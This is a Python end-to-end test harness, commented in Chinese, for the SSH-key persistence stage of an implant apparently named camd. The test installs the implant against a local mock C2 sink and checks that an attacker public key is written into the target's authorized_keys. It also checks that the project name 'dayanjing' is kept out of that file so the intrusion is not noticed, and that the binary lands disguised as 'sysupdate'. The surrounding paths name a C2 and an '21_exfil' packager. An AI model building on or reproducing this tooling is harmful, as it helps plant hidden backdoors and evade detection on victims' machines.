#!/usr/bin/env python3
"""
sshkey 驻留守卫（第三种驻留机制的端到端接线）。

背景：要求的驻留是 systemd / cron / sshkey 三段。此前 sshkey 段整条是断的
——camd 从未调用 persist_sshkey_pubkey，而 persist 在公钥未注入时生成返回 0
（拒绝），于是：

    部署侧看到 persist_linux_ensure 返回成功（部分成功分支成立），
    sshkey 段却是死的——配了、没生效、没有任何一处报错。

本守卫覆盖三段语义，并对关键一条做反向注入，证明断言有鉴别力而非恒绿。

场景
  F1 有效公钥  -> authorized_keys 真写入，含公钥 blob
  F2 标记不暴露 -> authorized_keys 不含项目名（否则 cat 一下即暴露意图）
  F3 无公钥    -> 合法形态：sshkey 不启用，install 仍成功
  F4 部署期拦截 -> 非法公钥在装之前被拦，不是"装完了才跑不起来"
  R1 反向      -> 去掉部署期校验，F4 必须失效（证明 F4 不是恒绿）

退出 0 = 全过；非 0 = 有失败。
"""

import os
import shutil
import socket
import subprocess
import sys
import threading
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
CAND = os.path.join(REPO, "agent_windows", "build", "linux", "camd")
MAKER = os.path.join(REPO, "21_exfil", "make_onekey.py")

# 项目名若出现在目标机 ~/.ssh/authorized_keys 里，一次 cat 就暴露意图。
PROJECT_MARKER = "dayanjing"

PASS = 0
FAIL = 0


def ck(name, cond, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print("[OK] %s %s" % (name, detail))
    else:
        FAIL += 1
        print("[FAIL] %s %s" % (name, detail))


def start_sink():
    """单进程内起 TCP 收端。后台进程会把调用方挂死，这是反复踩过的坑。"""
    tot = [0]
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(8)
    port = srv.getsockname()[1]

    def handle(c):
        while True:
            try:
                b = c.recv(65536)
            except Exception:
                break
            if not b:
                break
            tot[0] += len(b)
        c.close()

    def accept_loop():
        while True:
            try:
                c, _ = srv.accept()
            except Exception:
                return
            threading.Thread(target=handle, args=(c,), daemon=True).start()

    threading.Thread(target=accept_loop, daemon=True).start()
    return port, tot


def make_script(workdir, binary):
    out = os.path.join(workdir, "ok.sh")
    p = subprocess.run([sys.executable, MAKER, "amd64=" + binary, "-o", out],
                       capture_output=True, text=True, timeout=120)
    if p.returncode != 0 or not os.path.exists(out):
        return None
    return out


def run_install(script, pfx, port, extra):
    env = dict(os.environ)
    env["PREFIX"] = pfx
    return subprocess.run(
        ["sh", script, "install", "--c2", "127.0.0.1:%d" % port,
         "--backend", "mock"] + extra,
        env=env, capture_output=True, text=True, timeout=180)


def find_ak(pfx):
    for root, _dirs, files in os.walk(pfx):
        if "authorized_keys" in files:
            return os.path.join(root, "authorized_keys")
    return None


def main():
    # 前置：缺产物必须 FATAL，不得静默跳过——"没验证"混进通过数就是
    # "没验证"冒充"验证通过"。
    if not os.path.exists(CAND):
        print("[FATAL] 缺少 camd 二进制: %s" % CAND)
        return 1
    if not os.path.exists(MAKER):
        print("[FATAL] 缺少打包器: %s" % MAKER)
        return 1

    port, tot = start_sink()
    work = tempfile.mkdtemp(prefix="vk_sshkey_", dir="/data/workspace")
    script = make_script(work, CAND)
    if not script:
        print("[FATAL] 生成一键脚本失败")
        return 1

    # ---- 造公钥 ----
    keydir = os.path.join(work, "k")
    os.makedirs(keydir, exist_ok=True)
    kp = os.path.join(keydir, "id_ed25519")
    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-f", kp,
                    "-N", "", "-C", "svc-ops@host"],
                   capture_output=True, timeout=60)
    good = kp + ".pub"
    if not os.path.exists(good):
        print("[FATAL] 无法生成测试公钥（ssh-keygen 不可用）")
        return 1
    blob = open(good).read().split()[1]

    bad = os.path.join(keydir, "bad.pub")
    open(bad, "w").write("garbage-not-a-key\n")

    # ---- F1/F2：有效公钥 ----
    pfx1 = os.path.join(work, "p1")
    r1 = run_install(script, pfx1, port, ["--ssh-pubkey", good])
    ck("F1 install 成功（有效公钥）", r1.returncode == 0,
       "rc=%d" % r1.returncode)
    ak1 = find_ak(pfx1)
    ck("F1 authorized_keys 真写入", ak1 is not None, str(ak1))
    if ak1:
        body = open(ak1).read()
        ck("F1 含公钥 blob", blob in body, blob[:16] + "...")
        ck("F2 标记不暴露项目名",
           PROJECT_MARKER.lower() not in body.lower(),
           "不含 %s" % PROJECT_MARKER)

    # ---- F3：无公钥（合法形态）----
    pfx2 = os.path.join(work, "p2")
    r2 = run_install(script, pfx2, port, [])
    ck("F3 无公钥时 install 仍成功", r2.returncode == 0,
       "rc=%d" % r2.returncode)
    ck("F3 无公钥时不启用 sshkey", find_ak(pfx2) is None,
       "authorized_keys 未生成")

    # ---- F4：非法公钥必须在部署期被拦 ----
    pfx3 = os.path.join(work, "p3")
    r3 = run_install(script, pfx3, port, ["--ssh-pubkey", bad])
    out3 = (r3.stdout or "") + (r3.stderr or "")
    ck("F4 非法公钥被部署期拦截", r3.returncode != 0,
       "rc=%d" % r3.returncode)
    ck("F4 报错点名公钥非法", "内容非法" in out3, "")
    pkfile = os.path.join(pfx3, "etc", "sysupdate", "pubkey.txt")
    ck("F4 拦截发生在落盘之前", not os.path.exists(pkfile),
       "pubkey.txt 未生成")

    # ---- R1 反向：去掉部署期校验，F4 必须失效 ----
    # 注入副本，不改被测文件。
    inj = os.path.join(work, "ok_inj.sh")
    src = open(script, encoding="utf-8", errors="replace").read()
    target = ('        *) DIE "--ssh-pubkey 内容非法'
              '（首行需带 ssh-/ecdsa-/sk- 前缀）: $PUBKEY_SRC" ;;')
    if target not in src:
        ck("R1 注入点存在", False, "未找到校验行——判据已失效，必须修正守卫")
    else:
        open(inj, "w", encoding="utf-8").write(
            src.replace(target, "        *) : ;;"))
        pfx4 = os.path.join(work, "p4")
        r4 = run_install(inj, pfx4, port, ["--ssh-pubkey", bad])
        out4 = (r4.stdout or "") + (r4.stderr or "")
        # 去掉校验后，非法公钥会被照样落盘 —— 即"装完了才跑不起来"。
        pk4 = os.path.join(pfx4, "etc", "sysupdate", "pubkey.txt")
        ck("R1 去掉校验后非法公钥被落盘", os.path.exists(pk4),
           "证明 F4 有鉴别力，非恒绿")
        # 判据不能用"是否出现'内容非法'字样"：camd 运行期也会报同一句话。
        # 要看的是**拦截时机**——去掉部署期校验后，安装会一直走到二进制
        # 落盘，失败被推迟到运行期（装完了才跑不起来）。
        bin4 = os.path.join(pfx4, "usr", "local", "bin", "sysupdate")
        ck("R1 去掉校验后拦截推迟到运行期", os.path.exists(bin4),
           "二进制已落盘——装完了才失败")

    print("\n=== C2 实收 = %d 字节 ===" % tot[0])
    print("total=%d pass=%d fail=%d" % (PASS + FAIL, PASS, FAIL))
    shutil.rmtree(work, ignore_errors=True)
    return 0 if FAIL == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
